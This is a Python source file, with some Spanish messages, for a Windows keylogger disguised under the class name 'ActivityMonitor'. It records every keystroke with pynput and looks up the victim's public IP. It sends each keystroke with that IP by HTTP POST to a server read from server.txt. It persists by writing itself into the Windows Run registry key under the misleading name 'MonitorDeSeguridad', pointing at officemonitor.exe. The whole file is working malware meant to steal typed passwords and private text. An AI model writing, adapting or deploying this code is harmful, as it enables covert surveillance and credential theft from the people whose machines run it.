import os
import winreg as reg
import asyncio
import aiohttp
from pynput import keyboard
import requests

class ActivityMonitor:
    def __init__(self, server_url):
        self.server_url = server_url
        self.public_ip = self.get_public_ip()
        self.key_buffer = []
        self.buffer_limit = 1

    def get_public_ip(self):
        try:
            response = requests.get('https://api.ipify.org')
            return response.text.strip()
        except Exception as e:
            return None

    def log_activity(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                log_message = key.char
            else:
                log_message = self.format_special_key(key)

            self.key_buffer.append(log_message)

            if len(self.key_buffer) >= self.buffer_limit:
                asyncio.run(self.send_log_to_server("\n".join(self.key_buffer)))
                self.key_buffer.clear()

        except Exception:
            pass

    def format_special_key(self, key):
        special_keys = {
            keyboard.Key.ctrl_l: "Ctrl",
            keyboard.Key.ctrl_r: "Ctrl",
            keyboard.Key.shift_l: "Shift",
            keyboard.Key.shift_r: "Shift",
            keyboard.Key.alt_l: "Alt",
            keyboard.Key.alt_r: "Alt",
            keyboard.Key.enter: "Enter",
            keyboard.Key.space: "Space",
            keyboard.Key.esc: "Esc",
            keyboard.Key.tab: "Tab",
            keyboard.Key.backspace: "Backspace",
            keyboard.Key.delete: "Delete",
            keyboard.Key.caps_lock: "Caps Lock",
            keyboard.Key.pause: "Pause",
            keyboard.Key.insert: "Insert",
            keyboard.Key.up: "Arrow Up",
            keyboard.Key.down: "Arrow Down",
            keyboard.Key.left: "Arrow Left",
            keyboard.Key.right: "Arrow Right",
        }
        return f"[{special_keys.get(key, f'Tecla especial: {key}')}]"

    async def send_log_to_server(self, log_message):
        if self.public_ip:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(self.server_url, data={
                        'ip': self.public_ip,
                        'log': log_message
                    }) as response:
                        if response.status != 200:
                            print("Error.")
            except Exception as e:
                print(f"Error: {e}")

    def on_press(self, key):
        self.log_activity(key)

    def on_release(self, key):
        if key == keyboard.Key.esc:
            return False

    def start(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

def add_to_registry(exe_path, program_name):
    try:
        registry_key = reg.OpenKey(
            reg.HKEY_CURRENT_USER, 
            r"Software\Microsoft\Windows\CurrentVersion\Run", 
            0, reg.KEY_WRITE
        )
        reg.SetValueEx(registry_key, program_name, 0, reg.REG_SZ, exe_path)
        reg.CloseKey(registry_key)
    except Exception as e:
        print(f"Error al modificar el registro: {e}")

def read_server_url_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            return file.readline().strip()
    except Exception as e:
        print(f"Error al leer el archivo de configuración: {e}")
        return None

if __name__ == "__main__":
    server_url = read_server_url_from_file(os.path.join(os.path.dirname(__file__), "server.txt"))
    if not server_url:
        exit()

    activity_monitor = ActivityMonitor(server_url=server_url)

    exe_path = os.path.abspath("dist/officemonitor.exe")
    program_name = "MonitorDeSeguridad"

    add_to_registry(exe_path, program_name)

    try:
        activity_monitor.start()
    except KeyboardInterrupt:
        pass
    except Exception:
        pass
